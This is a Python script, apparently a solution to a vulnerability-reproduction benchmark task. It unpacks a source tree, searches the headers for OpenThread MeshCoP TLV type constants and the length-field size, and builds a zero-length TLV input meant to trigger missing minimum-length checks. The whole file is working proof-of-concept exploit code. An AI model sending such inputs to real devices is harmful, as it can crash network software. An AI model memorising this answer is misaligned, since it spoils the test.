import os
import tarfile
import tempfile
import re
from typing import Dict, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Determine root directory containing the source files
        root_dir: Optional[str] = None
        tmpdir: Optional[str] = None

        if os.path.isdir(src_path):
            root_dir = src_path
        else:
            try:
                tmpdir = tempfile.mkdtemp(prefix="src-")
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tmpdir)
                root_dir = tmpdir
            except Exception:
                # If extraction fails, fall back to a generic PoC
                return bytes((14, 0))

        if root_dir is None or not os.path.isdir(root_dir):
            # Fallback PoC if source cannot be accessed
            return bytes((14, 0))

        # Collect all plausible source files
        source_files: List[str] = []
        for dirpath, _, filenames in os.walk(root_dir):
            for filename in filenames:
                if filename.endswith((".h", ".hpp", ".hh", ".c", ".cc", ".cpp", ".cxx")):
                    source_files.append(os.path.join(dirpath, filename))

        # Regex patterns to find TLV type values
        patterns: Dict[str, re.Pattern] = {
            "kActiveTimestamp": re.compile(r"\bkActiveTimestamp\s*=\s*(0x[0-9a-fA-F]+|\d+)\b"),
            "kPendingTimestamp": re.compile(r"\bkPendingTimestamp\s*=\s*(0x[0-9a-fA-F]+|\d+)\b"),
            "kDelayTimer": re.compile(r"\bkDelayTimer\s*=\s*(0x[0-9a-fA-F]+|\d+)\b"),
        }

        candidates: Dict[str, List[Tuple[str, int]]] = {name: [] for name in patterns.keys()}
        length_size_candidates: List[Tuple[str, int]] = []

        for path in source_files:
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    text = f.read()
            except Exception:
                continue

            lower_path = path.lower()

            # Try to detect TLV length field size in relevant headers (if present)
            if ("meshcop" in lower_path or "dataset" in lower_path) and "mLength" in text:
                idx_struct = text.find("struct Tlv")
                idx_class = text.find("class Tlv")
                idx = idx_struct if idx_struct != -1 else idx_class
                if idx != -1:
                    snippet = text[idx:idx + 400]
                    m = re.search(r"uint(8|16)_t\s+[^;]*\bmLength\b", snippet)
                    if m:
                        bits = m.group(1)
                        size = 1 if bits == "8" else 2
                        length_size_candidates.append((path, size))

            # Collect enumeration candidates for the TLV type values
            for name, pattern in patterns.items():
                for m in pattern.finditer(text):
                    val = int(m.group(1), 0)
                    candidates[name].append((path, val))

        def choose_value(name: str) -> Optional[int]:
            cand_list = candidates.get(name)
            if not cand_list:
                return None
            preferred_keywords = ["meshcop", "dataset", "tlv"]
            for kw in preferred_keywords:
                kw_lower = kw.lower()
                for path, val in cand_list:
                    if kw_lower in path.lower():
                        return val
            return cand_list[0][1]

        def choose_length_size() -> int:
            if not length_size_candidates:
                # Default assumption: 1-byte length field (common in OpenThread TLVs)
                return 1
            preferred_keywords = ["meshcop", "dataset", "tlv"]
            for kw in preferred_keywords:
                kw_lower = kw.lower()
                for path, size in length_size_candidates:
                    if kw_lower in path.lower():
                        return size
            return length_size_candidates[0][1]

        length_size = choose_length_size()

        chosen_type: Optional[int] = None
        for name in ("kActiveTimestamp", "kPendingTimestamp", "kDelayTimer"):
            v = choose_value(name)
            if v is not None:
                chosen_type = v
                break

        if chosen_type is None:
            # Fallback to a common MeshCoP Active Timestamp TLV type value
            chosen_type = 14

        # Construct a single TLV with zero-length value to exploit missing min-length checks.
        if length_size == 2:
            poc = bytes(((chosen_type & 0xFF), 0x00, 0x00))
        else:
            poc = bytes(((chosen_type & 0xFF), 0x00))

        return poc
